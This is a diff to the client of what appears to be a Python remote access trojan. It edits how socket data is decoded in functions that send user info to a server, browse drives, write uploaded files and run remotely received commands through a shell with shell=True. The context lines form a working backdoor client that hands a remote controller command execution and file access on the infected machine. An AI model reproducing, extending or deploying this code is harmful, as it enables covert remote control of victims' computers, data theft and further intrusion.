@@ -106,9 +106,6 @@ def server_connect():
 
     send(json.dumps(arrUserInfo).encode())
 
-# function to return decoded utf-8
-decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
-
 # function to receive data
 recv = lambda buffer: objSocket.recv(buffer)
 
@@ -187,7 +184,7 @@ def file_browser():
         strDrives += drive.replace("\\", "") + "\n"
     send(strDrives.encode())
 
-    strDir = decode_utf8(recv(intBuff))
+    strDir = recv(intBuff).decode()
 
     if os.path.isdir(strDir):
         if strDir[:-1] != "\\" or strDir[:-1] != "/":
@@ -210,7 +207,7 @@ def file_browser():
 def upload(data):
     intBuffer = int(data)
     file_data = recvall(intBuffer)
-    strOutputFile = decode_utf8(recv(intBuff))
+    strOutputFile = recv(intBuff).decode()
 
     try:
         with open(strOutputFile, "wb") as objFile:
@@ -247,7 +244,7 @@ def command_shell():
     send(os.getcwdb())
 
     while True:
-        strData = decode_utf8(recv(intBuff))
+        strData = recv(intBuff).decode()
 
         if strData == "goback":
             os.chdir(strCurrentDir)  # change directory back to original
@@ -256,16 +253,15 @@ def command_shell():
         elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
             objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             if objCommand.stderr.read().decode() == "":  # if there is no error
-                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
+                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
 
                 bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
 
         elif len(strData) > 0:
             objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
-
-            bytData = f"{strOutput}\n{os.getcwd()}>".encode()
+            strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
+            bytData = strOutput + b'\n' + os.getcwdb() + b'>'
         else:
             bytData = b"Error!"
 
@@ -395,7 +391,7 @@ while True:
     try:
         while True:
             strData = recv(intBuff)
-            strData = decode_utf8(strData)
+            strData = strData.decode()
 
             if strData == "exit":
                 objSocket.close()
